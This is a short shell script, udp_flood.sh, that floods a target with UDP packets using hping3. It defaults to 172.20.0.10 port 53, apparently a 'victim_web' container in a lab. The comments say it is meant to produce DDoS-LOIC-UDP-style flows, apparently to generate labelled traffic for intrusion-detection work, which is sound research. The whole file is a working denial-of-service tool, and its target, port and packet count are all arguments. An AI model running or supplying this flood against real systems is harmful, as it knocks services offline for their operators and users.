#!/bin/sh
# udp_flood.sh — UDP flood against victim_web (172.20.0.10:53)
# Generates DDoS-LOIC-UDP-style flows: high fwd_pkts_per_sec, low flow_iat_mean.
# -k keeps source port fixed so packets group into one flow.
TARGET=${1:-172.20.0.10}
PORT=${2:-53}
COUNT=${3:-10000}
echo "[attack] UDP flood → $TARGET:$PORT  ($COUNT packets)"
hping3 --udp -k -p "$PORT" -c "$COUNT" --faster "$TARGET"
